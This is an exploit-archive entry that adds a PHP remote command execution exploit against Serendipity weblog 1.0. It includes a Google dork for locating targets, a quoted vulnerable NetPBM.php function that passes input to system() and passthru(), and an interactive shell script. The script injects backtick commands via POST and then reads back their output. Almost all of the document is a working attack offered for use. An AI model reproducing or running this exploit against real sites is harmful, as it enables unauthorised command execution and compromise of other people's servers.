@@ -1,0 +1,107 @@
+id: 17842
+date: 03/27/2012
+title: Serendipity PHP Weblog System Remote Command Execution
+author: L3b-r1'z
+cves: 
+
+<?
+/*
+# Exploit Title: Serendipity PHP Weblog System Remote Command Execution
+# Date: 27/mar/2012
+# Author: L3b-r1'z
+# Vendor or Software Link: http://sourceforge.net/projects/php-blog/files/latest/download?source=directory
+# Version: 1.0
+# Category: webapps
+# Google dork: allintext: "Powered by Serendipity"
+# Tested on: linux \ bt
+# Security: RISK
+# Greet'z : Mad Hacker'z , Sec4ever , Sec4leb (Sec4leb.com) , I-Hmx , Mr.Black , Lito , Mr.XKILler , Mr.Ps , The Injector , Ked-Ans , Unk Hacker , Inj3ct0r Team , And All My Friends :D
+
+Vuln Code in : \serendipity\htmlarea\plugins\ImageManager\Classes\NetPBM.php
+
+    function save($filename, $type=null, $quality = 85)
+    {
+        $cmd = $this->_postProcess('', $quality, $type) . ">$filename";
+           
+        //if we have windows server
+        if(isset($_ENV['OS']) && eregi('window',$_ENV['OS']))
+            $cmd = ereg_replace('/','\\',$cmd);
+        //echo $cmd."##";
+        $output = system($cmd);
+        error_log('NETPBM: '.$cmd);
+        //error_log($output);
+        $this->command = array();
+    } // End save
+
+
+    /**
+     * Display image without saving and lose changes
+     *
+     * @param string $type (jpeg,png...);
+     * @param int $quality 75
+     * @return none
+     */
+    function display($type = null, $quality = 75)
+    {
+        header('Content-type: image/' . $type);
+        $cmd = $this->_postProcess($type, $quality);
+       
+        passthru($cmd);
+        $this->command = array();
+    }
+
+
+*/
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+ 
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80))) die("\n[-] No response from {$host}:80\n");
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+print "\n+-----------------------------------------------------------------------------------------------------------------------+";
+print "\n| Serendipity PHP Weblog System Remote Command Execution Exploit by L3b-r1'z |";
+print "\n+-----------------------------------------------------------------------------------------------------------------------+\n";
+ if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /Serendipity/\n";
+    die();
+}
+
+list($host, $path) = array($argv[1], $argv[2]);
+
+$r_pack  = "GET {$path}htmlarea/plugins/ImageManager/Classes/ HTTP/1.0\r\n";
+$r_pack .= "Host: {$host}\r\n";
+$r_pack .= "Connection: close\r\n\r\n";
+
+ $packet  = "POST {$path}NetPBM.php HTTP/1.0\r\n";
+ $packet .= "Host: {$host}\r\n";
+ $packet .= "Content-Length: %d\r\n";
+ $packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+ $packet .= "X_REQUESTED_WITH: XMLHttpRequest\r\n";
+ $packet .= "Connection: close\r\n\r\n%s";
+ 
+while(1)
+{
+    print "\nL3br1z-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    else if (preg_match('/\./', $cmd)) print "\nDots not allowed!\n";
+    else if (preg_match('/\)/', $cmd)) print "\nParenthesis not allowed!\n";
+    else
+    {
+        $payload = "cmd=.(`{$cmd}>cmd`).";
+        http_send($host, sprintf($packet, strlen($payload), $payload));
+        $output = http_send($host, $r_pack);
+        !preg_match('/404 not/i', $output) && preg_match('/\n\r\n(.*)/s', $output, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
+    }
+}
+?>
+
+
+
+#  0day.today [2023-03-22]  #
